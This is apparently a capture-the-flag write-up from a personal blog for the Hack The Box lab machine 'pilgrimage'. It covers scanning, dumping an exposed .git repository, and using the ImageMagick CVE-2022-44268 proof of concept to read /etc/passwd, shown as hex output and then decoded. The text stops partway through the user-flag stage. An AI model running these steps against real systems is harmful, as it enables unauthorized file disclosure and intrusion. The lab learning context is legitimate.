<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta http-equiv=Content-Security-Policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self' https://www.dropbox.com https://*.dl.dropboxusercontent.com https://photos.app.goo.gl https://drive.google.com https://photos.google.com https://video-downloads.googleusercontent.com https://*.googleusercontent.com https://*.googlevideo.com https://youtube.googleapis.com; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self' https://w.soundcloud.com https://www.youtube.com https://www.youtube-nocookie.com https://www.dropbox.com http://localhost https://www.dropbox.com http://darvein.local https://disqus.com; img-src 'self' https://photos.google.com https://lh3.googleusercontent.com https://www.dropbox.com https://*.dl.dropboxusercontent.com https://*.disqus.com https://c.disquscdn.com; object-src https://lh3.googleusercontent.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/ https://c.disquscdn.com; script-src 'self' 'unsafe-inline' https://www.google-analytics.com https://cdnjs.cloudflare.com https://www.googletagmanager.com https://www.dropbox.com http://localhost http://darvein.local https://drv21.disqus.com https://c.disquscdn.com; prefetch-src 'self' https://youtube.googleapis.com; connect-src 'self' https://www.google-analytics.com https://links.services.disqus.com;"><meta name=author content="Dennis Ruiz"><meta name=description content="easy - pilgrimage Machine: pilgrimage.htb
User flag Basic nmap scanning:
~z➤ sudo nmap -n -Pn -sV -O -T4 pilgrimage.htb ... PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) 80/tcp open http nginx 1.18.0 We can notice it is a simple web page, let&rsquo;s see the html content:
~z➤ curl -s http://pilgrimage.htb/ | ag href | ag -v assets ... <a href=&#34;/&#34; class=&#34;logo&#34;> <li><a href=&#34;/&#34; class=&#34;active&#34;>Home</a></li> <li><a href=&#34;login."><meta name=keywords content="blog,developer,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content><meta name=twitter:description content="easy - pilgrimage Machine: pilgrimage.htb
User flag Basic nmap scanning:
~z➤ sudo nmap -n -Pn -sV -O -T4 pilgrimage.htb ... PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) 80/tcp open http nginx 1.18.0 We can notice it is a simple web page, let&rsquo;s see the html content:
~z➤ curl -s http://pilgrimage.htb/ | ag href | ag -v assets ... <a href=&#34;/&#34; class=&#34;logo&#34;> <li><a href=&#34;/&#34; class=&#34;active&#34;>Home</a></li> <li><a href=&#34;login."><meta property="og:title" content><meta property="og:description" content="easy - pilgrimage Machine: pilgrimage.htb
User flag Basic nmap scanning:
~z➤ sudo nmap -n -Pn -sV -O -T4 pilgrimage.htb ... PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) 80/tcp open http nginx 1.18.0 We can notice it is a simple web page, let&rsquo;s see the html content:
~z➤ curl -s http://pilgrimage.htb/ | ag href | ag -v assets ... <a href=&#34;/&#34; class=&#34;logo&#34;> <li><a href=&#34;/&#34; class=&#34;active&#34;>Home</a></li> <li><a href=&#34;login."><meta property="og:type" content="article"><meta property="og:url" content="https://www.darvein.net/infosec/htb/machines/easy/pilgrimage/"><meta property="article:section" content="infosec"><title>easy - pilgrimage </title><link rel=canonical href=https://www.darvein.net/infosec/htb/machines/easy/pilgrimage/><link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.a1a7e7e7bd8b6629931805334fd6cf056ee6f154702847e6d597bbfe80446a0d.css integrity="sha256-oafn572LZimTGAUzT9bPBW7m8VRwKEfm1Ze7/oBEag0=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.39e41a7f16bdf8cb16e43cae7d714fa1016f1d2d2898a5b3f27f42c9979204e2.css integrity="sha256-OeQafxa9+MsW5DyufXFPoQFvHS0omKWz8n9CyZeSBOI=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/custom.min.7cf8a329bb485491ed5be45bd286916c655bf66e11e3fe4d82649437eae8b51b.css integrity="sha256-fPijKbtIVJHtW+Rb0oaRbGVb9m4R4/5NgmSUN+rotRs=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/images/safari-pinned-tab.svg color=#5bbad5><meta name=generator content="Hugo 0.120.4"></head><body class="preload-transitions colorscheme-dark"><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/>Darvein
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/infosec/>Infosec</a></li><li class=navigation-item><a class=navigation-link href=/coding/>Coding</a></li><li class=navigation-item><a class=navigation-link href=/devops/>Devops</a></li></ul></section></nav><div class=content><section class="container page"><article><h1 id=easy---pilgrimage>easy - pilgrimage
<a class=heading-link href=#easy---pilgrimage><i class="fa fa-link" aria-hidden=true></i></a></h1><p>Machine: pilgrimage.htb</p><h2 id=user-flag>User flag
<a class=heading-link href=#user-flag><i class="fa fa-link" aria-hidden=true></i></a></h2><p>Basic nmap scanning:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~z➤ sudo nmap -n -Pn -sV -O -T4 pilgrimage.htb
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
</span></span><span style=display:flex><span>80/tcp open  http    nginx 1.18.0
</span></span></code></pre></div><p>We can notice it is a simple web page, let&rsquo;s see the html content:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~z➤ curl -s http://pilgrimage.htb/ | ag href | ag -v assets
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>                    &lt;a <span style=color:#fb660a>href</span>=<span style=color:#0086d2>&#34;/&#34;</span> <span style=color:#fb660a>class</span>=<span style=color:#0086d2>&#34;logo&#34;</span>&gt;
</span></span><span style=display:flex><span>                        &lt;li&gt;&lt;a <span style=color:#fb660a>href</span>=<span style=color:#0086d2>&#34;/&#34;</span> <span style=color:#fb660a>class</span>=<span style=color:#0086d2>&#34;active&#34;</span>&gt;Home&lt;/a&gt;&lt;/li&gt;
</span></span><span style=display:flex><span>                        &lt;li&gt;&lt;a <span style=color:#fb660a>href</span>=<span style=color:#0086d2>&#34;login.php&#34;</span>&gt;Login&lt;/a&gt;&lt;/li&gt;
</span></span><span style=display:flex><span>                        &lt;li&gt;&lt;a <span style=color:#fb660a>href</span>=<span style=color:#0086d2>&#34;register.php&#34;</span>&gt;Register&lt;/a&gt;&lt;/li&gt;
</span></span><span style=display:flex><span>                        &lt;li&gt;&lt;a <span style=color:#fb660a>href</span>=<span style=color:#0086d2>&#34;dashboard.php&#34;</span>&gt;Dashboard&lt;/a&gt;&lt;/li&gt;
</span></span><span style=display:flex><span>                        &lt;li&gt;&lt;a <span style=color:#fb660a>href</span>=<span style=color:#0086d2>&#34;logout.php&#34;</span>&gt;Logout&lt;/a&gt;&lt;/li&gt;
</span></span><span style=display:flex><span>...
</span></span></code></pre></div><p>So the site is hosting a PHP website</p><figure class=image-container><a href=/i/2023-07-19_18-58.png><img width=100% src=/i/2023-07-19_18-58.png alt="Image shrinker PHP page"></a><figcaption>&#8213; Image shrinker PHP page &#8213;</figcaption></figure><p>So after testing the app, it gave me a download url
<a href=http://pilgrimage.htb/shrunk/64b86aa39ecce.jpeg>http://pilgrimage.htb/shrunk/64b86aa39ecce.jpeg</a>
I tried to read the metadata with <code>identify</code> and <code>exiftool</code>.</p><p>Here I&rsquo;m running a more agresive scan on the port 80, see what we can find!:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~z➤ sudo nmap -p <span style=color:#0086f7;font-weight:700>80</span> -A -T4 10.10.11.219
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>80/tcp open  http    nginx 1.18.0
</span></span><span style=display:flex><span>| http-cookie-flags:
</span></span><span style=display:flex><span>|   /:
</span></span><span style=display:flex><span>|     PHPSESSID:
</span></span><span style=display:flex><span>|_      httponly flag not set
</span></span><span style=display:flex><span>|_http-title: Pilgrimage - Shrink Your Images
</span></span><span style=display:flex><span>| http-git:
</span></span><span style=display:flex><span>|   10.10.11.219:80/.git/
</span></span><span style=display:flex><span>|     Git repository found!
</span></span><span style=display:flex><span>|     Repository description: Unnamed repository; edit this file <span style=color:#0086d2>&#39;description&#39;</span> to name the...
</span></span><span style=display:flex><span>|_    Last commit message: Pilgrimage image shrinking service initial commit. <span style=color:#080;background-color:#0f140f;font-style:italic># Please ...</span>
</span></span><span style=display:flex><span>|_http-server-header: nginx/1.18.0
</span></span><span style=display:flex><span>Warning: OSScan results may be unreliable because we could not find at least <span style=color:#0086f7;font-weight:700>1</span> open and <span style=color:#0086f7;font-weight:700>1</span> closed port
</span></span><span style=display:flex><span>Aggressive OS guesses: Linux 5.0 (96%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or <span style=color:#0086f7;font-weight:700>211</span> Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)
</span></span><span style=display:flex><span>No exact OS matches <span style=color:#fb660a;font-weight:700>for</span> host (test conditions non-ideal).
</span></span><span style=display:flex><span>Network Distance: <span style=color:#0086f7;font-weight:700>2</span> hops
</span></span><span style=display:flex><span>...
</span></span></code></pre></div><p>I&rsquo;ve found this tool <code>git-dumper</code> that dumps a git repository from a website:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~z➤ git-dumper http://pilgrimage.htb/.git/ git
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>[-] Fetching http://pilgrimage.htb/.git/objects/fb/f9e44d80c149c822db0b575dbfdc4625744aa4 [200]
</span></span><span style=display:flex><span>[-] Fetching http://pilgrimage.htb/.git/objects/23/1150acdd01bbbef94dfb9da9f79476bfbb16fc [200]
</span></span><span style=display:flex><span>[-] Fetching http://pilgrimage.htb/.git/objects/ca/d9dfca08306027b234ddc2166c838de9301487 [200]
</span></span><span style=display:flex><span>[-] Fetching http://pilgrimage.htb/.git/objects/f1/8fa9173e9f7c1b2f30f3d20c4a303e18d88548 [200]
</span></span><span style=display:flex><span>[-] Running git checkout .
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>~z➤ ls
</span></span><span style=display:flex><span>assets  dashboard.php  index.php  login.php  logout.php  magick  register.php  vendor
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>~z➤ file *
</span></span><span style=display:flex><span>assets:        directory
</span></span><span style=display:flex><span>dashboard.php: PHP script, Unicode text, UTF-8 text, with CRLF line terminators
</span></span><span style=display:flex><span>index.php:     PHP script, Unicode text, UTF-8 text, with CRLF line terminators
</span></span><span style=display:flex><span>login.php:     PHP script, Unicode text, UTF-8 text, with CRLF line terminators
</span></span><span style=display:flex><span>logout.php:    PHP script, ASCII text, with CRLF line terminators
</span></span><span style=display:flex><span>magick:        ELF 64-bit LSB executable, x86-64, version <span style=color:#0086f7;font-weight:700>1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span style=color:#fb660a;font-weight:700>for</span> GNU/Linux 2.6.32, BuildID[sha1]=9fdbc145689e0fb79cb7291203431012ae8e1911, stripped
</span></span><span style=display:flex><span>register.php:  PHP script, Unicode text, UTF-8 text, with CRLF line terminators
</span></span><span style=display:flex><span>vendor:        directory
</span></span></code></pre></div><p>So we can see here how that bin file magick is being used:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~z➤ ag magick
</span></span><span style=display:flex><span>index.php
</span></span><span style=display:flex><span>27:      exec(<span style=color:#0086d2>&#34;/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/&#34;</span> . <span style=color:#fb660a>$upload</span>-&gt;getName() . <span style=color:#fb660a>$mime</span> . <span style=color:#0086d2>&#34; -resize 50% /var/www/pilgrimage.htb/shrunk/&#34;</span> . <span style=color:#fb660a>$newname</span> . <span style=color:#fb660a>$mime</span>);
</span></span></code></pre></div><p>Let&rsquo;s now find some exploits for this:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~z➤ ./magick -version
</span></span><span style=display:flex><span>Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
</span></span></code></pre></div><p>Found this:</p><ul><li><a href=https://www.exploit-db.com/exploits/51261>https://www.exploit-db.com/exploits/51261</a></li><li><a href=https://github.com/voidz0r/CVE-2022-44268>https://github.com/voidz0r/CVE-2022-44268</a></li><li><a href=https://github.com/Sybil-Scan/imagemagick-lfi-poc>https://github.com/Sybil-Scan/imagemagick-lfi-poc</a></li></ul><p>I&rsquo;ve picked up the CVE-2022-44268 repo:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~z/CVE-2022-44268➤ cargo run <span style=color:#0086d2>&#34;/etc/passwd&#34;</span>
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>  Downloaded cfg-if v1.0.0
</span></span><span style=display:flex><span>  Downloaded <span style=color:#0086f7;font-weight:700>8</span> crates (301.4 KB) in 1.16s
</span></span><span style=display:flex><span>   Compiling crc32fast v1.3.2
</span></span><span style=display:flex><span>     ...
</span></span><span style=display:flex><span>   Compiling cve-2022-44268 v0.1.0 (/home/n0kt/blog/content/infosec/htb/p8/pilgrimage/CVE-2022-44268)
</span></span><span style=display:flex><span>    Finished dev [unoptimized + debuginfo] target(s) in 4.42s
</span></span><span style=display:flex><span>     Running <span style=color:#0086d2>`</span>target/debug/cve-2022-44268 /etc/passwd<span style=color:#0086d2>`</span>
</span></span></code></pre></div><p>Now uploading the resultant image.png to the webpage, get the shrinked image and check the metadata:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~z/CVE-2022-44268➤ wget http://pilgrimage.htb/shrunk/64b874aa305d1.png
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>Saving to: ‘64b874aa305d1.png’
</span></span><span style=display:flex><span>1.-07-19 19:40:28 (47.0 MB/s) - ‘64b874aa305d1.png’ saved [1080/1080]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>~z/CVE-2022-44268➤ identify -verbose 64b874aa305d1.png
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>    png:IHDR.interlace_method: <span style=color:#0086f7;font-weight:700>0</span> (Not interlaced)
</span></span><span style=display:flex><span>    png:IHDR.width,height: 100, <span style=color:#0086f7;font-weight:700>100</span>
</span></span><span style=display:flex><span>    png:PLTE.number_colors: <span style=color:#0086f7;font-weight:700>2</span>
</span></span><span style=display:flex><span>    png:text: <span style=color:#0086f7;font-weight:700>4</span> tEXt/zTXt/iTXt chunks were found
</span></span><span style=display:flex><span>    png:tIME: 2023-07-19T23:41:30Z
</span></span><span style=display:flex><span>    Raw profile type:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#0086f7;font-weight:700>1437</span>
</span></span><span style=display:flex><span>726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d
</span></span><span style=display:flex><span>6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f
</span></span><span style=display:flex><span>6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e
</span></span><span style=display:flex><span>2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f736269
</span></span><span style=display:flex><span>6e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f
</span></span><span style=display:flex><span>62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d
</span></span><span style=display:flex><span>65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a
</span></span><span style=display:flex><span>2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a
</span></span><span style=display:flex><span>783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f
</span></span><span style=display:flex><span>6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f757372
</span></span><span style=display:flex><span>2f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73
</span></span><span style=display:flex><span>706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31
</span></span><span style=display:flex><span>303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f
</span></span><span style=display:flex><span>6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573
</span></span><span style=display:flex><span>722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d
</span></span><span style=display:flex><span>646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b
</span></span><span style=display:flex><span>75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f
</span></span><span style=display:flex><span>7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c69
</span></span><span style=display:flex><span>7374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67
</span></span><span style=display:flex><span>696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f73
</span></span><span style=display:flex><span>62696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d
</span></span><span style=display:flex><span>5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e
</span></span><span style=display:flex><span>6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a3635353334
</span></span><span style=display:flex><span>3a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e
</span></span><span style=display:flex><span>2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374
</span></span><span style=display:flex><span>656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f72
</span></span><span style=display:flex><span>6b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d65
</span></span><span style=display:flex><span>6e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e
</span></span><span style=display:flex><span>0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d642052
</span></span><span style=display:flex><span>65736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f
</span></span><span style=display:flex><span>6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e65786973
</span></span><span style=display:flex><span>74656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573
</span></span><span style=display:flex><span>796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e69
</span></span><span style=display:flex><span>7a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c
</span></span><span style=display:flex><span>6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d
</span></span><span style=display:flex><span>652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a78
</span></span><span style=display:flex><span>3a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f
</span></span><span style=display:flex><span>7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f
</span></span><span style=display:flex><span>737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a393938
</span></span><span style=display:flex><span>3a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    ...
</span></span><span style=display:flex><span>  Pixels per second: 17.2051MP
</span></span><span style=display:flex><span>  User time: 0.000u
</span></span><span style=display:flex><span>  Elapsed time: 0:01.000
</span></span><span style=display:flex><span>  Version: ImageMagick 7.1.1-13 Q16-HDRI x86_64 <span style=color:#0086f7;font-weight:700>21276</span> https://imagemagick.org
</span></span></code></pre></div><p>Decoding it from hexadecimal:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span>&gt;&gt; ...
</span></span><span style=display:flex><span>a2f3a2f7573722f7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a3939383a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a<span style=color:#0086d2>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&gt;&gt; bytes.fromhex(hex).decode(<span style=color:#0086d2>&#34;utf-8&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#0086d2>&#39;root:x:0:0:root:/root:/bin/bash</span><span style=color:#0086d2>\n</span><span style=color:#0086d2>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><span style=color:#0086d2>\n</span><span style=color:#0086d2>bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><span style=color:#0086d2>\n</span><span style=color:#0086d2>sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><span style=color:#0086d2>\n</span><span style=color:#0086d2>sync:x:4:65534:sync:/bin:/bin/sync</span><span style=color:#0086d2>\n</span><span style=color:#0086d2>games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><span style=color:#0086d2>\n</span><span style=color:#0086d2>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><span style=color:#0086d2>\n</span><span style=color:#0086d2>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><span style=color:#0086d2>\n</span><span style=color:#0086d2>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><span style=color:#0086d2>\n</span><span style=color:#0086d2>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><span style=color:#0086d2>\n</span><span style=color:#0086d2>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><span style=color:#0086d2>\n</span><span style=color:#0086d2>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><span style=color:#0086d2>\n</span><span style=color:#0086d2>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><span style=color:#0086d2>\n</span><span style=color:#0086d2>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><span style=color:#0086d2>\n</span><span style=color:#0086d2>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><span style=color:#0086d2>\n</span><span style=color:#0086d2>irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><span style=color:#0086d2>\n</span><span style=color:#0086d2>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><span style=color:#0086d2>\n</span><span style=color:#0086d2>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><span style=color:#0086d2>\n</span><span style=color:#0086d2>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><span style=color:#0086d2>\n</span><span style=color:#0086d2>systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><span style=color:#0086d2>\n</span><span style=color:#0086d2>systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><span style=color:#0086d2>\n</span><span style=color:#0086d2>messagebus:x:103:109::/nonexistent:/usr/sbin/nologin</span><span style=color:#0086d2>\n</span><span style=color:#0086d2>systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><span style=color:#0086d2>\n</span><span style=color:#0086d2>emily:x:1000:1000:emily,,,:/home/emily:/bin/bash</span><span style=color:#0086d2>\n</span><span style=color:#0086d2>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><span style=color:#0086d2>\n</span><span style=color:#0086d2>sshd:x:105:65534::/run/sshd:/usr/sbin/nologin</span><span style=color:#0086d2>\n</span><span style=color:#0086d2>_laurel:x:998:998::/var/log/laurel:/bin/false</span><span style=color:#0086d2>\n</span><span style=color:#0086d2>&#39;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>root:x:0:0:root:/root:/bin/bash
</span></span><span style=display:flex><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span></span><span style=display:flex><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span></span><span style=display:flex><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span></span><span style=display:flex><span>sync:x:4:65534:sync:/bin:/bin/sync
</span></span><span style=display:flex><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span></span><span style=display:flex><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span></span><span style=display:flex><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span></span><span style=display:flex><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span></span><span style=display:flex><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span></span><span style=display:flex><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span></span><span style=display:flex><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span></span><span style=display:flex><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span></span><span style=display:flex><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span></span><span style=display:flex><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span></span><span style=display:flex><span>irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
</span></span><span style=display:flex><span>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
</span></span><span style=display:flex><span>nobody:x:65534:65534:nobody:/nonexistent/usr/sbin/nologin
</span></span><span style=display:flex><span>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style=display:flex><span>systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style=display:flex><span>messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style=display:flex><span>emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
</span></span><span style=display:flex><span>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
</span></span><span style=display:flex><span>sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
</span></span><span style=display:flex><span>_laurel:x:998:998::/var/log/laurel:/bin/false
</span></span></code></pre></div><p>In a simple glance, we can see user <code>emily</code>.</p><p>After reviewing a little bit all php files, I found a database file.</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>➤ ag var *.php
</span></span><span style=display:flex><span>dashboard.php:14:  <span style=color:#fb660a>$db</span> = new PDO(<span style=color:#0086d2>&#39;sqlite:/var/db/pilgrimage&#39;</span>);
</span></span><span style=display:flex><span>dashboard.php:151:    var <span style=color:#fb660a>imageTable</span> = <span style=color:#0086d2>&#34;&lt;table id=\&#34;customers\&#34;&gt;&lt;tr&gt;&lt;th&gt;Original Image Name&lt;/th&gt;&lt;th&gt;Shrunken Image URL&lt;/th&gt;&lt;/tr&gt;&#34;</span>
</span></span><span style=display:flex><span>index.php:16:    <span style=color:#fb660a>$image</span>-&gt;setLocation(<span style=color:#0086d2>&#34;/var/www/pilgrimage.htb/tmp&#34;</span>);
